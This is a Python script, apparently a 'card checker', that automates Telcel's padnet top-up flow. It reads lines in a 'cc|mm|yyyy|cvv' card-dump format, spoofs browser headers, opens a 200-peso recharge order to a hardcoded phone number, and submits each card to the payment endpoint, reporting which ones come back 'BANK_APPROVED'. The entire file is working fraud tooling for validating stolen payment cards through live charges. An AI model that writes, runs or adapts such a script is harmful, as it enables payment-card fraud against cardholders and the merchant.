import json
import re
import requests

def procesar_tarjeta_telcel(correo, password, linea_cc):
    try:
        cc_partes = linea_cc.split("|")
        cc = cc_partes[0]
        mm = cc_partes[1]
        yyyy = cc_partes[2]
        cvv = cc_partes[3]
    except IndexError:
        return False, "Formato incorrecto en la línea de tarjeta"

    # ccExp requiere mes + últimos 2 dígitos del año (ej: 1126)
    cc_exp = f"{mm}{yyyy[-2:]}"

    session = requests.Session()

    # 1. GTE_TOKEN (GET https://padnet.telcel.com/)
    url_gte = "https://padnet.telcel.com/"
    headers_gte = {
        "Host": "padnet.telcel.com",
        "Accept-Language": "es-419,es;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "Windows",
        "Referer": "https://www.google.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }

    try:
        resp1 = session.get(url_gte, headers=headers_gte, timeout=15)
        address = resp1.url
        if "=" in address:
            token_raiz = address.split("=")[1]
        else:
            token_raiz = ""
    except Exception as e:
        return False, f"Excepción en GTE_TOKEN: {e}"

    # 2. NUMERO (POST https://padnet.telcel.com/eiko-profile/profile/sendPackage)
    url_num = "https://padnet.telcel.com/eiko-profile/profile/sendPackage"
    headers_num = {
        "Host": "padnet.telcel.com",
        "Content-Length": "12",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Authorization": f"Bearer {token_raiz}",
        "Cache-Control": "no-cache",
        "Accept-Language": "es-419,es;q=0.9",
        "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://padnet.telcel.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://padnet.telcel.com/portal/send-balance",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    content_num = "522481371170"

    try:
        resp2 = session.post(url_num, headers=headers_num, data=content_num, timeout=15)
        match_token = re.search(r'"([^"]+)"', resp2.text)
        token = match_token.group(1) if match_token else resp2.text.strip('"')
    except Exception as e:
        return False, f"Excepción en sendPackage: {e}"

    # 3. FOLIO_RECARGA_DE_200 (POST https://padnet.telcel.com/eiko-order/orders/beginOrder)
    url_order = "https://padnet.telcel.com/eiko-order/orders/beginOrder"
    headers_order = {
        "Host": "padnet.telcel.com",
        "Content-Length": "103",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Authorization": f"Bearer {token}",
        "Cache-Control": "no-cache",
        "Accept-Language": "es-419,es;q=0.9",
        "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://padnet.telcel.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://padnet.telcel.com/portal/packages/PA200",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    payload_order = {"paymentId": "b844642d-ecc0-4b41-9ffd-5600df9983bc", "packageId": "35a0930e-5c92-490d-b855-922f156ba286"}

    try:
        resp3 = session.post(url_order, headers=headers_order, json=payload_order, timeout=15)
        order_json = resp3.json()
        folio = order_json.get("folio")
        if not folio:
            return False, "No se pudo obtener el folio"
    except Exception as e:
        return False, f"Excepción en beginOrder: {e}"

    # 4. GEN_TRANSACCION (POST https://padnet.telcel.com/eiko-order/sanval/beginTransaction)
    url_trans = "https://padnet.telcel.com/eiko-order/sanval/beginTransaction"
    headers_trans = headers_order.copy()
    headers_trans["Referer"] = "https://padnet.telcel.com/portal/packages/PA200"
    payload_trans = {"folio": folio}

    try:
        resp4 = session.post(url_trans, headers=headers_trans, json=payload_trans, timeout=15)
        match_final = re.search(r'index\.html\?orderId=([^"]+)', resp4.text)
        token_final = match_final.group(1) if match_final else ""
        if not token_final:
            return False, "No se pudo obtener token final (orderId)"
    except Exception as e:
        return False, f"Excepción en beginTransaction: {e}"

    # 5. CHECK_CC (POST https://padnet.telcel.com/sanval/api/makePayment)
    url_pay = "https://padnet.telcel.com/sanval/api/makePayment"
    headers_pay = {
        "Host": "padnet.telcel.com",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "es-419,es;q=0.9",
        "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
        "Content-Type": "application/json;charset=UTF-8",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Origin": "https://padnet.telcel.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://padnet.telcel.com/sanval/widgets/balance/telcel/latest/index.html?orderId={token_final}",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    payload_pay = {
        "ccCvv": cvv,
        "ccExp": cc_exp,
        "ccNumber": cc,
        "orderId": token_final,
        "extraInputs": []
    }

    try:
        resp5 = session.post(url_pay, headers=headers_pay, json=payload_pay, timeout=15)
        resp_text = resp5.text
        
        if "BANK_APPROVED" in resp_text:
            try:
                res_json = resp5.json()
                result_status = res_json.get("resultStatus", "BANK_APPROVED")
                result_code = res_json.get("resultCode", "SUCCESS")
                msg = f"{result_status} - {result_code}"
            except Exception:
                msg = "BANK_APPROVED"
            return True, msg
        else:
            try:
                res_json = resp5.json()
                errors = res_json.get("errors", {})
                if errors:
                    msg = str(errors)
                else:
                    msg = res_json.get("resultCode", "TRANSACTION_FAILED")
            except Exception:
                msg = "TRANSACTION_FAILED"
            return False, msg

    except Exception as e:
        return False, f"Excepción en makePayment: {e}"